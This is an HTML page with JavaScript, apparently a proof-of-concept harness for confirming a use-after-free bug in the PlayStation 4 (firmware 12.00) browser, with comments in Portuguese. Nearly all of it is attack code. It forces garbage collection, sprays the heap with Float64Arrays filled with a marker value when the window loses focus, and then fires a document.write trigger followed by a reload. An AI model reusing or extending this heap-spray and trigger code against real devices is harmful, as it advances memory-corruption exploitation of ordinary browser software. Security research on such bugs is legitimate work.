<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF Confirmation</title>
</head>
<body>

<h2>PS4 12.00 - UAF Confirmation</h2>

<button onclick="runTest(0)">1. Baseline</button>
<button onclick="runTest(1)">2. Keep Alive (No GC)</button>
<button onclick="runTest(2)">3. Force GC</button>

<div id="log"></div>

<script>
const PATTERN = 2.121995791e-314;

let globalKeepAlive = null;

function runTest(mode) {
    const log = document.getElementById("log");
    log.innerHTML = "<p>Running... Press OPTIONS</p>";

    let controllers = [];

    // Passo 1 (inalterado)
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    // 🔴 Controle de retenção
    if (mode === 1) {
        // KEEP ALIVE → impede GC
        globalKeepAlive = controllers;
    }

    // Fullscreen (inalterado)
    document.documentElement.webkitRequestFullscreen?.();

    window.onblur = function() {

        if (mode === 2) {
            // 🔥 FORÇA GC
            controllers = null;

            for (let i = 0; i < 20000; i++) {
                new ArrayBuffer(0x10000);
            }
        }

        if (mode === 0) {
            // Baseline (inalterado)
        }

        if (mode === 1) {
            // KEEP ALIVE → NÃO liberar
        }

        // Spray mantido
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }

        // Gatilho crítico (inalterado)
        setTimeout(() => {
            document.open();
            document.write("<h1>Crash</h1>");
            document.close();
            setTimeout(() => location.reload(), 500);
        }, 3000);
    };
}
</script>

</body>
</html>
